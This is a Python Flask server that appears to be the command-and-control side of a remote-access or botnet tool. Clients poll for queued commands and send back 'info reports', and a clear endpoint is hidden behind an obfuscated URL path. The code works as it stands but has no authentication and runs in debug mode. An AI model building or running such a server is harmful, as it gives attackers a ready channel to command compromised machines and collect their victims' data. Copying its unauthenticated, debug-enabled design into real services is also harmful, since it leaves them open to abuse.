from flask import Flask, request, jsonify
from threading import Lock, Thread
import time

app = Flask(__name__)
commands = {}
active_users = {}
user_infos = {}
lock = Lock()

USER_TIMEOUT = 10

@app.route('/send', methods=['POST'])
def send_command():
    data = request.get_json()
    target = data.get('to')
    command = {
        "command": data.get('command'),
        "args": data.get('args')
    }

    if not target or not command["command"]:
        return jsonify({"error": "invalid cmd data"}), 400

    with lock:
        if target not in commands:
            commands[target] = []
        commands[target].append(command)

    return jsonify({"status": "queued", "to": target})

@app.route('/poll/<userid>')
def poll(userid):
    with lock:
        active_users[userid] = time.time()
        cmds = commands.get(userid, [])
        commands[userid] = []
    return jsonify(cmds)

@app.route('/active')
def get_active_users():
    with lock:
        return jsonify(list(active_users.keys()))

@app.route('/disconnect', methods=['POST'])
def disconnect():
    data = request.get_json()
    userid = data.get('userid')
    with lock:
        active_users.pop(userid, None)
        user_infos.pop(userid, None)
    return jsonify({"status": "disconnected", "userid": userid})

@app.route('/info_report', methods=['POST'])
def info_report():
    data = request.get_json()
    userid = data.get('userid')
    if not userid:
        return jsonify({"error": "missing userid"}), 400

    with lock:
        user_infos[userid] = data
    return jsonify({"status": "info saved", "userid": userid})

@app.route('/info_report/<userid>', methods=['GET'])
def get_info(userid):
    with lock:
        info = user_infos.get(userid)
    if not info:
        return jsonify({"error": "no info found"}), 404
    return jsonify(info)

@app.route('/clear_omgpwmgpwemgpwempogpowempom6po34m6346346346', methods=['POST'])
def clear_active():
    with lock:
        active_users.clear()
        user_infos.clear()
    return jsonify({"status": "cleared active users and info reports"})

def cleanup_inactive_users():
    while True:
        time.sleep(5)
        now = time.time()
        with lock:
            inactive = [uid for uid, last_seen in active_users.items() if now - last_seen > USER_TIMEOUT]
            for uid in inactive:
                active_users.pop(uid, None)
                user_infos.pop(uid, None)

Thread(target=cleanup_inactive_users, daemon=True).start()

if __name__ == '__main__':
    app.run(debug=True)
